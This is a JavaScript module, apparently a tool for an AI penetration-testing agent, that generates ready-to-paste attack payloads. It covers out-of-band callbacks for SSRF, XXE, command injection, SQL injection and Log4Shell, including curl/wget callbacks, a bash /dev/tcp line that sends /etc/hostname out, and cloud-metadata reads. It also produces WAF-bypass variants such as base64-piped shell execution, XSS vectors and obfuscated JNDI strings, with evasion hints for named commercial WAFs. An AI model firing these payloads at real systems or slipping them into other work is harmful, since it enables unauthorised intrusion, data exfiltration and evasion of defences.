// Payload builders: out-of-band triggers and WAF bypass variants.
//
// Two jobs, both mechanical so the model stops hand-editing strings:
//   oobPayloads()    — turn one probe into ready-to-paste payloads for the
//                      families that only prove out when the target calls back.
//   bypassVariants() — a family x transformation matrix, so "it was filtered"
//                      produces the next concrete payload instead of a retry.
//
// Anything this module cannot actually observe is marked in `note` rather than
// implied: the shipped listener speaks HTTP (+ optional DNS), not LDAP/SMTP.

const FAMILIES = ['ssrf', 'xxe', 'rce', 'sqli', 'jndi', 'log4j', 'smtp', 'ldap']

function joinUrl(baseUrl, token, suffix = '') {
  const base = String(baseUrl ?? '').replace(/\/+$/, '')
  return `${base}/${token}${suffix}`
}

/**
 * Build the payload set for one probe.
 * @returns {{family:string, listener:string, probe:string, payloads:Array<{label:string,payload:string,note:string}>}}
 */
export function oobPayloads({ family, baseUrl, dnsName = '', token, target = '' }) {
  const kind = String(family ?? '').toLowerCase()
  if (!FAMILIES.includes(kind)) {
    throw new Error(`pt_oob_payload: family must be one of ${FAMILIES.join(', ')} (got ${JSON.stringify(family)})`)
  }
  const probe = joinUrl(baseUrl, token)
  const dns = dnsName !== '' ? dnsName : `${token}.oob.invalid`
  const out = []
  const push = (label, payload, note) => out.push({ label, payload, note })

  switch (kind) {
    case 'ssrf':
      push('http-url', probe, '最直接的盲 SSRF 探测：注意目标侧出网策略/DNS 解析可能在服务端完成')
      push('scheme-relative', `//${probe.replace(/^https?:\/\//, '')}`, '参数被拼进已有 URL 时用协议相对形式绕过校验')
      push('gopher', `gopher://${probe.replace(/^https?:\/\//, '')}/_test`, 'gopher 可用于构造任意 TCP 报文（Redis/MySQL 等内网协议）')
      push('dict', `dict://${probe.replace(/^https?:\/\//, '')}/x`, 'dict 常被遗漏在协议白名单里')
      push('cloud-metadata', 'http://169.254.169.254/latest/meta-data/', '非带外项：回显型 SSRF 直接读元数据，命中后用 pt_evidence_save 存证据')
      break
    case 'xxe':
      push(
        'external-entity-http',
        `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE r [<!ENTITY x SYSTEM "${probe}">]>\n<r>&x;</r>`,
        '最基础的外部实体：目标解析即回连',
      )
      push(
        'parameter-entity-probe',
        `<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY % p SYSTEM "${probe}">%p;]>`,
        '参数实体变体：绕过只校验普通实体的过滤器',
      )
      push(
        'dns-exfil',
        `<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY % p SYSTEM "http://${dns}/">%p;]>`,
        `需 DNS 监听就绪；未就绪时该条只会失败，不要据此判死`,
      )
      push('xinclude', `<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="${probe}" parse="text"/></x>`, '目标不解析 DTD 但支持 XInclude 时用')
      break
    case 'rce':
      push('curl', `curl -s ${probe} >/dev/null`, '命令注入/模板注入里最稳的回连方式')
      push('wget', `wget -qO- ${probe} >/dev/null`, '目标无 curl 时的等价物')
      push('dns-lookup', `nslookup ${dns}`, '出网被限但 DNS 可出时用')
      push('ping-dns', `ping -c 1 ${dns}`, 'ICMP/DNS 可用、HTTP 被封时用')
      push('powershell', `powershell -nop -c "iwr -UseBasicParsing ${probe}"`, 'Windows 目标')
      push('subshell', `$(curl -s ${probe})`, '套进命令替换上下文；反引号形式 `curl -s ' + probe + '` 亦可')
      push('tcp-redirect', `bash -c 'cat /etc/hostname > /dev/tcp/${probe.replace(/^https?:\/\//, '').split('/')[0]}'`, 'HTTP 完全不出网时的 TCP 侧信道')
      break
    case 'sqli':
      push('mssql-xp-dirtree', `'; EXEC master..xp_dirtree '\\\\${dns}\\a';--`, 'MSSQL 经典带外：需 DNS 监听')
      push('oracle-utl-http', `' UNION SELECT UTL_HTTP.REQUEST('${probe}') FROM dual--`, 'Oracle 需 UTL_HTTP 权限')
      push('oracle-utl-inaddr', `' AND UTL_INADDR.GET_HOST_ADDRESS('${dns}') IS NOT NULL--`, 'Oracle 9i+ 盲注带外')
      push('mysql-load-file', `' UNION SELECT LOAD_FILE('\\\\\\\\${dns}\\\\a')--`, 'MySQL/Windows UNC 路径触发 SMB/DNS 解析')
      push('postgres-copy-program', `'; COPY (SELECT '') TO PROGRAM 'curl -s ${probe}';--`, 'PostgreSQL 超级用户带外命令执行')
      push('time-blind-fallback', `' AND 1=(SELECT 1 FROM pg_sleep(5))--`, '带外不可用时的替代判据（时间盲注，需多次基线对比）')
      break
    case 'jndi':
      push('jndi-ldap', `\${jndi:ldap://${probe.replace(/^https?:\/\//, '')}}`, 'shipped listener 不监听 LDAP：该条只在你有 LDAP 回连服务时有效')
      push('jndi-dns', `\${jndi:dns://${dns}}`, 'JNDI 的 DNS provider：只要有 DNS 监听即可确认')
      push('jndi-rmi', `\${jndi:rmi://${probe.replace(/^https?:\/\//, '')}}`, '同 LDAP：需对应回连服务')
      break
    case 'log4j':
      push('plain', `\${jndi:ldap://${probe.replace(/^https?:\/\//, '')}}`, 'Log4Shell 基础形态')
      push('lower-obfuscation', `\${${'${lower:j}'}ndi:ldap://${probe.replace(/^https?:\/\//, '')}}`, '绕过只匹配 ${jndi: 字面量的 WAF')
      push('dash-obfuscation', `\${${'${::-j}'}${'${::-n}'}${'${::-d}'}${'::-i}'}:ldap://${probe.replace(/^https?:\/\//, '')}}`, '更强混淆，常用于已确认存在 Log4j 但被拦')
      push('dns-only', `\${jndi:dns://${dns}}`, '只需 DNS 监听即可确认命中')
      break
    case 'smtp':
      push('smtp-url', `curl -s smtp://${dns}:25/x`, '需目标可出 25 端口且你有 SMTP 监听；shipped listener 不含 SMTP')
      push('mailto-header', `X-Probe: ${dns}`, '邮件头注入场景：用接收方 MTA 记录域名解析')
      break
    case 'ldap':
      push('ldap-url', `ldap://${dns}:389/x`, '需自建 LDAP 回连服务；shipped listener 不含 LDAP')
      push('ldap-search-filter', `*(|(objectClass=*)(cn=${dns}))`, 'LDAP 注入场景的盲探')
      break
    default:
      break
  }
  if (String(target ?? '').trim() !== '') {
    push('target-note', `# target: ${target}`, '把该值拼进真实请求时保留原始参数编码，不要改动目标自身参数')
  }
  return {
    family: kind,
    listener: 'http',
    probe,
    dnsName: dns,
    payloads: out,
  }
}

const TRANSFORMS = {
  sql: [
    ['case-swap', (p) => p.replace(/select/gi, 'SeLeCt').replace(/union/gi, 'UnIoN')],
    ['comment-pad', (p) => p.replace(/\s+/g, '/**/')],
    ['tab-whitespace', (p) => p.replace(/\s+/g, '%09')],
    ['urlencode', (p) => encodeURIComponent(p)],
    ['double-urlencode', (p) => encodeURIComponent(encodeURIComponent(p))],
    ['concat-split', (p) => p.replace(/union/gi, 'un/**/ion').replace(/select/gi, 'sel/**/ect')],
    ['hex-literal', (p) => p.replace(/'([^']*)'/g, (_, text) => `0x${Buffer.from(text, 'utf8').toString('hex')}`)],
  ],
  xss: [
    ['img-onerror', () => '<img src=x onerror=alert(1)>'],
    ['svg-onload', () => '<svg/onload=alert(1)>'],
    ['script-case', () => '<ScRiPt>alert(1)</ScRiPt>'],
    ['html-entity', () => '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;'],
    ['double-encode', () => '%253Cscript%253Ealert(1)%253C%252Fscript%253E'],
    ['js-protocol', () => 'javascript:alert(1)'],
    ['no-parens', () => '<img src=x onerror=alert`1`>'],
  ],
  rce: [
    ['ifs-space', (p) => p.replace(/\s+/g, '${IFS}')],
    ['dollar-ifs', (p) => p.replace(/\s+/g, '$IFS')],
    ['newline-split', (p) => p.replace(/\s+/g, '%0a')],
    ['backtick', (p) => `\`${p}\``],
    ['base64-pipe', (p) => `echo ${Buffer.from(p, 'utf8').toString('base64')}|base64 -d|sh`],
    ['brace-expand', (p) => p.replace(/\s+/g, '{,}')],
  ],
  ssrf: [
    ['decimal-ip', (p) => p.replace(/127\.0\.0\.1/, '2130706433')],
    ['octal-ip', (p) => p.replace(/127\.0\.0\.1/, '0177.0.0.1')],
    ['hex-ip', (p) => p.replace(/127\.0\.0\.1/, '0x7f.1')],
    ['ipv6-loopback', (p) => p.replace(/127\.0\.0\.1/, '[::1]')],
    ['userinfo-trick', (p) => p.replace(/^http:\/\//, 'http://allowed.example@')],
    ['short-localhost', (p) => p.replace(/127\.0\.0\.1/, 'localhost')],
    ['redirect-note', (p) => `# 把 ${p} 放到可控跳转参数上，让服务端二次请求`],
  ],
  ssti: [
    ['jinja', () => '{{7*7}}'],
    ['freemarker', () => '${7*7}'],
    ['erb', () => '<%= 7*7 %>'],
    ['ruby', () => '#{7*7}'],
    ['spring', () => '*{7*7}'],
    ['velocity', () => '#set($x=7*7)$x'],
  ],
  jndi: [
    ['lower', () => '${${lower:j}ndi:ldap://PROBE/a}'],
    ['dash', () => '${${::-j}${::-n}${::-d}${::-i}:ldap://PROBE/a}'],
    ['env', () => '${${env:NaN:-j}ndi:ldap://PROBE/a}'],
    ['upper', () => '${${upper:j}ndi:ldap://PROBE/a}'],
  ],
}

const WAF_HINTS = {
  cloudflare: { first: ['double-urlencode', 'comment-pad'], note: 'Cloudflare 对单次编码的 SQLi/XSS 特征命中率高，先上双重编码与注释拆分' },
  akamai: { first: ['case-swap', 'concat-split'], note: 'Akamai 对固定字面量敏感，优先大小写与关键字拆分' },
  safedog: { first: ['comment-pad', 'tab-whitespace'], note: '安全狗对空格/注释敏感，用 %09 或 /**/ 替换空白' },
  '360waf': { first: ['hex-literal', 'double-urlencode'], note: '360 对引号内容做字符串匹配，先转十六进制字面量' },
  modsecurity: { first: ['double-urlencode', 'newline-split'], note: 'CRS 规则集对经典签名敏感，编码与换行拆分并行试' },
  unknown: { first: [], note: '' },
}

/**
 * Transformation matrix for one family. `base` is transformed by each rule so the
 * model gets concrete next payloads; the WAF hint only reorders the list.
 */
export function bypassVariants({ family, base = '', waf = '' }) {
  // Accept the OOB family spelling too (`sqli` → `sql`) so one vocabulary serves both.
  const alias = { sqli: 'sql', injection: 'rce', command: 'rce', template: 'ssti' }
  const requested = String(family ?? '').toLowerCase()
  const kind = alias[requested] ?? requested
  const table = TRANSFORMS[kind]
  if (!table) throw new Error(`pt_defense matrix: family must be one of ${Object.keys(TRANSFORMS).join(', ')}`)
  const hint = WAF_HINTS[String(waf ?? '').toLowerCase()] ?? WAF_HINTS.unknown
  const seed = String(base ?? '').trim()
  const variants = table.map(([label, apply]) => {
    let payload
    try {
      payload = apply(seed)
    } catch (error) {
      payload = `(生成失败: ${error?.message ?? error})`
    }
    return {
      label,
      payload: seed === '' && !payload.includes('PROBE') ? `${payload}  ← 需自行把 PROBE/路径替换为探测点` : payload,
      note: seed === '' ? '未给 base：这是该变体的独立形态，需填入真实探测点' : '按变体改写后重发，勿重复同一原始 payload',
    }
  })
  const rank = (item) => {
    const index = hint.first.indexOf(item.label)
    return index === -1 ? hint.first.length + 1 : index
  }
  variants.sort((a, b) => rank(a) - rank(b))
  return { family: kind, waf: String(waf ?? '') || 'unknown', note: hint.note, variants }
}

export const PAYLOAD_FAMILIES = FAMILIES
export const MATRIX_FAMILIES = Object.keys(TRANSFORMS)
